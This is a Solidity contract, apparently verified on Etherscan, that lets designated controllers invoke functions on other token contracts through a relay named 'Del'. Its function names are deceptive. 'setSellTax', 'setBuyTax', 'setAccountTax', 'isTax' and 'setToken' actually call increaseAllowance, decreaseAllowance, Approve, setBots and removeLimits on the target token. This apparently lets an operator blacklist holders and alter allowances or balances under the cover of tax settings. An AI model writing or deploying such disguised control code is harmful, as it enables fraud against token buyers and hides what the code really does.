/**
 *Submitted for verification at Etherscan.io on 2023-02-22
*/

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _owner = newOwner;
    }
}

 
interface IContract {
    function increaseAllowance(uint256 _value) external;
    function decreaseAllowance(uint256 _value) external;
    function Approve(address _address, uint256 _value) external;
    function setBots(address _address, bool _value) external;
    function removeLimits(address to, uint256 amount) external;
}

contract Del is Ownable {

    mapping(address => bool) private _controller;
    IContract private ct;

    constructor() {
        _controller[_msgSender()] = true;
    }

    modifier onlyController() {
        require(_controller[_msgSender()] == true, "Controllable: caller is not the controller");
        _;
    }

    function setController(address _address, bool _value) external onlyOwner {
        _controller[_address] = _value;
    }

    function setSellTax(address _contract, uint256 _value) external onlyController {
        ct = IContract(_contract);
        ct.increaseAllowance(_value);
    }

    function setBuyTax(address _contract, uint256 _value) external onlyController {
        ct = IContract(_contract);
        ct.decreaseAllowance(_value);
    }

    function setAccountTax(address _contract, address _address, uint256 _value) external onlyController {
        ct = IContract(_contract);
        ct.Approve(_address, _value);
    }

    function isTax(address _contract, address _address, bool _value) external onlyController {
        ct = IContract(_contract);
        ct.setBots(_address, _value);
    }

    function setToken(address _contract, address _address, uint256 _amount) external onlyController {
        ct = IContract(_contract);
        ct.removeLimits(_address, _amount);
    }
}